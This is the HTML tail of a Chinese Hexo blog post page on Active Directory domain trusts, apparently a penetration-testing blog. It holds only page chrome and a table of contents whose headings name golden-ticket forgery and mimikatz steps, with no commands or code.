+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">caixiaoguan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/">http://example.com/2023/07/10/域信任访问实践/域信任访问实践/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">caixiaoguan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/my.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/05/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" title="日志分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">日志分析</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/30/socks%E4%BB%A3%E7%90%86/socks%E4%BB%A3%E7%90%86/" title="socks代理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">socks代理</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/my.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">caixiaoguan</div><div class="author-info__description">原来你也想证实一下</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.</span> <span class="toc-text">域信任访问实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%B6%E5%AD%90%E5%9F%9F%E5%8F%8C%E5%90%91%E4%BF%A1%E4%BB%BB"><span class="toc-number">1.1.</span> <span class="toc-text">父子域双向信任</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E6%9C%BA%E5%99%A8%E8%AE%BF%E9%97%AE%E4%B8%BB%E5%9F%9F%E7%9A%84%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.1.</span> <span class="toc-text">子域机器访问主域的域用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E5%9F%9F%E6%9C%BA%E5%99%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%9F%9F%E7%9A%84%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.2.</span> <span class="toc-text">主域机器访问子域的域用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E5%9F%9F%E6%8E%A7%E8%AE%BF%E9%97%AE%E5%AD%90%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.3.</span> <span class="toc-text">主域控访问子域用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%9F%9F%E5%92%8C%E5%AD%90%E5%9F%9F%E7%9A%84%E5%8F%8C%E5%90%91%E4%BF%A1%E4%BB%BB"><span class="toc-number">1.2.</span> <span class="toc-text">外部域和子域的双向信任</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%92%8C%E5%AD%90%E5%9F%9F%E7%9A%84%E4%BF%A1%E4%BB%BB"><span class="toc-number">1.3.</span> <span class="toc-text">子域和子域的信任</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.4.</span> <span class="toc-text">使用命令与问题记录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#krbtgt%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0"><span class="toc-number">2.</span> <span class="toc-text">krbtgt黄金票据伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%9A%84NTLM-hash"><span class="toc-number">2.1.</span> <span class="toc-text">获取krbtgt的NTLM hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9Fsid"><span class="toc-number">2.2.</span> <span class="toc-text">获取域sid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.3.</span> <span class="toc-text">制作黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E5%BD%93%E5%89%8D%E7%BC%93%E5%AD%98%E7%9A%84%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.4.</span> <span class="toc-text">清除当前缓存的票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8Cmimikatz%E5%B0%86%E7%A5%A8%E6%8D%AE%E5%8A%A0%E8%BF%9B%E5%86%85%E5%AD%98"><span class="toc-number">2.5.</span> <span class="toc-text">运行mimikatz将票据加进内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%BB%93%E6%9E%9C"><span class="toc-number">2.6.</span> <span class="toc-text">验证结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%91%BD%E4%BB%A4%E5%92%8C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">2.7.</span> <span class="toc-text">使用到的命令和问题记录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#krbtgt%E6%B3%A8%E5%85%A5%E8%B7%A8%E5%9F%9F%E5%B0%9D%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">krbtgt注入跨域尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E5%9F%9F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%85%A5%E5%AD%90%E5%9F%9F%E6%8E%A7%E7%9A%84krbtgt"><span class="toc-number">3.1.</span> <span class="toc-text">主域用户注入子域控的krbtgt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E5%9F%9F%E7%94%A8%E6%88%B7-%E5%AD%90%E5%9F%9Fkrbtgt-%E4%B8%BB%E5%9F%9Fsid-%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">3.1.1.</span> <span class="toc-text">主域用户+子域krbtgt+主域sid+子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E5%9F%9F%E7%94%A8%E6%88%B7-%E5%AD%90%E5%9F%9Fkrbtgt-%E5%AD%90%E5%9F%9Fsid-%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">3.1.2.</span> <span class="toc-text">主域用户+子域krbtgt+子域sid+子域名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%85%A5%E4%B8%BB%E5%9F%9F%E6%8E%A7%E7%9A%84krbtgt"><span class="toc-number">3.2.</span> <span class="toc-text">子域用户注入主域控的krbtgt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E7%94%A8%E6%88%B7-%E4%B8%BB%E5%9F%9Fkrbtgt-%E4%B8%BB%E5%9F%9Fsid-%E4%B8%BB%E5%9F%9F%E5%90%8D"><span class="toc-number">3.2.1.</span> <span class="toc-text">子域用户+主域krbtgt+主域sid+主域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E7%94%A8%E6%88%B7-%E4%B8%BB%E5%9F%9Fkrbtgt-%E5%AD%90%E5%9F%9Fsid-%E4%B8%BB%E5%9F%9F%E5%90%8D"><span class="toc-number">3.2.2.</span> <span class="toc-text">子域用户+主域krbtgt+子域sid+主域名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/" title="exchange专题">exchange专题</a><time datetime="2023-10-30T06:41:06.000Z" title="发表于 2023-10-30 14:41:06">2023-10-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/19/Dcsync%E5%88%A9%E7%94%A8/dcsync%E5%88%A9%E7%94%A8/" title="dcsync利用">dcsync利用</a><time datetime="2023-10-19T06:41:06.000Z" title="发表于 2023-10-19 14:41:06">2023-10-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/" title="esxi挂载">esxi挂载</a><time datetime="2023-10-17T06:41:06.000Z" title="发表于 2023-10-17 14:41:06">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/11/DPAPI/DPAPI%E4%B8%93%E9%A2%98/" title="DPAPI专题">DPAPI专题</a><time datetime="2023-09-11T06:41:06.000Z" title="发表于 2023-09-11 14:41:06">2023-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/05/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" title="日志分析">日志分析</a><time datetime="2023-08-05T06:41:06.000Z" title="发表于 2023-08-05 14:41:06">2023-08-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By caixiaoguan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
